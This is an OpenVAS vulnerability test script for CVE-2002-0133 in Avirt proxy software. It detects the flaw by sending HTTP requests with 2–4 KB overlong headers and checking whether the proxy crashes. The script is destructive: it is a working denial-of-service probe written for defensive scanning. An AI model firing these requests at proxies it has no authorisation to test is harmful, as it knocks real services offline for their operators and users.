# OpenVAS Vulnerability Test
# $Id: avirt_proxy_overflow.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Header overflow against HTTP proxy
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "It was possible to kill the HTTP proxy by
sending an invalid request with a too long header

A cracker may exploit this vulnerability to make your proxy server
crash continually or even execute arbitrary code on your system.";

tag_solution = "upgrade your software";

# *untested*
# Cf. RFC 1945 & RFC 2068
# Vulnerables:
# Avirt SOHO v4.2
# Avirt Gateway v4.2
# Avirt Gateway Suite v4.2
# 
# References:
# Date:  Thu, 17 Jan 2002 20:23:28 +0100
# From: "Strumpf Noir Society" <vuln-dev@labs.secureance.com>
# To: bugtraq@securityfocus.com
# Subject: Avirt Proxy Buffer Overflow Vulnerabilities

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11715");
  script_version("$Revision: 9348 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(3904, 3905);
  script_cve_id("CVE-2002-0133");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  name = "Header overflow against HTTP proxy";
  script_name(name);
 

 
  summary = "Too long HTTP header kills the HTTP proxy server";
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 
  script_copyright("This script is Copyright (C) 2003 Michel Arboi");
  family = "Gain a shell remotely";
  script_family(family);
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("http_func.inc");

port = get_http_port(default:8080);
if (http_is_dead(port: port)) exit(0);

soc = open_sock_tcp(port);
if(! soc) exit(0);

domain = get_kb_item("Settings/third_party_domain");
if(domain)
  test_host = string("www.", domain);
 else 
  test_host = "www";
   

headers = make_list(
	string("From: ", crap(2048), "@", crap(2048), ".org"),
	string("If-Modified-Since: Sat, 29 Oct 1994 19:43:31 ", 
		crap(data: "GMT", length: 4096)),
	string("Referer: http://", crap(4096), "/"),
# Many other HTTP/1.1 headers...
	string("If-Unmodified-Since: Sat, 29 Oct 1994 19:43:31 ", 
		crap(data: "GMT", length: 2048))	);
	

r1 = string("GET http://", test_host, "/", rand(), " HTTP/1.0\r\n");

foreach h (headers)
{
  r = string(r1, h, "\r\n\r\n");
  send(socket:soc, data: r);
  r = http_recv(socket:soc);
  close(soc);
  soc = open_sock_tcp(port);
  if (! soc)  {  security_message(port); exit(0); }
}

close(soc);

if (http_is_dead(port: port)) {  security_message(port); exit(0); }
